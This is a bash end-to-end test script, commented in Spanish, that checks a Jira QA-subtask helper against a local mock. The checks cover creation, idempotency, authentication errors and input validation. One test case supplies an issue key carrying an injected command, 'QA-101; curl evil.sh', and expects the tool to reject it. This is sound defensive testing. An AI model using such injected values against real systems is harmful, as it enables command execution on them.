#!/usr/bin/env bash
# E2E contra el mock: ejecuta la app y verifica el ESTADO del mock
# (subtareas (QE) bajo cada historia), no la salida de la app.
set -euo pipefail
cd "$(dirname "$0")/.."
source scripts/env.sh

"$MVN" -B -ntp -q package

export MOCK_JIRA_EMAIL=svc-qe@example.com MOCK_JIRA_TOKEN=ci-token
python3 mock/jira_mock.py > target/mock.log 2>&1 &
MOCK_PID=$!; trap 'kill $MOCK_PID 2>/dev/null || true' EXIT
for _ in $(seq 1 30); do curl -sf http://127.0.0.1:8089/health >/dev/null && break; sleep 0.3; done

# Cuántas subtareas "(QE) ..." tiene la historia en el mock.
qe_count() {
  curl -sf -u "$MOCK_JIRA_EMAIL:$MOCK_JIRA_TOKEN" "http://127.0.0.1:8089/rest/api/3/issue/$1" |
    python3 -I -c 'import json,sys; print(sum(s["fields"]["summary"].startswith("(QE) ") for s in json.load(sys.stdin)["fields"]["subtasks"]))'
}

PASS=0; FAIL=0
# check <nombre> <exit esperado> <historia> <subtareas QE esperadas> [VAR=valor...]
check() {
  local name="$1" expect="$2" story="$3" want="$4"; shift 4
  local out code got
  out="$(env JIRA_BASE_URL=http://127.0.0.1:8089 JIRA_EMAIL="$MOCK_JIRA_EMAIL" JIRA_API_TOKEN="$MOCK_JIRA_TOKEN" \
        GITHUB_STEP_SUMMARY= "$@" java -jar target/qe-helper.jar 2>&1)"; code=$?
  got="$(qe_count "$story")"
  if [[ "$code" == "$expect" && "$got" == "$want" ]]; then
    echo "✓ $name"; PASS=$((PASS+1))
  else
    echo "✗ $name (exit $code/$expect, subtareas QE en $story: $got/$want)"; echo "$out" | sed 's/^/    /'; FAIL=$((FAIL+1))
  fi
}
set +e
check "crea las 5 subtareas"      0 QA-100 5 QE_ISSUE_KEY=QA-100
check "re-ejecución no duplica"   0 QA-100 5 QE_ISSUE_KEY=QA-100
check "token incorrecto → 401"    1 QA-101 0 QE_ISSUE_KEY=QA-101 JIRA_API_TOKEN=malo
check "secreto faltante"          1 QA-101 0 QE_ISSUE_KEY=QA-101 JIRA_API_TOKEN=
check "issue inexistente → 404"   1 QA-101 0 QE_ISSUE_KEY=QA-999
check "input malicioso rechazado" 1 QA-101 0 QE_ISSUE_KEY='QA-101; curl evil.sh'
set -e
echo; echo "E2E: $PASS ok, $FAIL fallidos"
[[ $FAIL -eq 0 ]]
